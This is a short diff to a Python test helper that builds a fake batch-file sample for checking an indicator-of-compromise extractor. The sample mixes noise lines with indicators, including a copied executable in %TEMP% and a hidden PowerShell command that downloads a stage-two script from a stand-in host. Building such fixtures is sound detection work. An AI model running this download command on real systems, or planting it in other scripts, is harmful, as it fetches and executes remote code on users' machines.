@@ -1000,6 +1000,8 @@ def ioc_noise_bat() -> bytes:
         r"rem noise: C:\Tools\DocuTraceX\tools\python\python.exe",
         "rem noise (no such TLD at IANA): cfg.zz row.qq data.xx",
         "rem real: reply to accounts@billing-portal.example",
+        "rem noise: invoices are paid at month end, type of payment: transfer",
+        r'copy "C:\Program Files\Billing Portal\inv viewer.exe" %TEMP%\inv.exe',
         "powershell -nop -w hidden -c \"iwr http://billing-portal.example/inv/stage2.ps1\"",
         "",
     ]
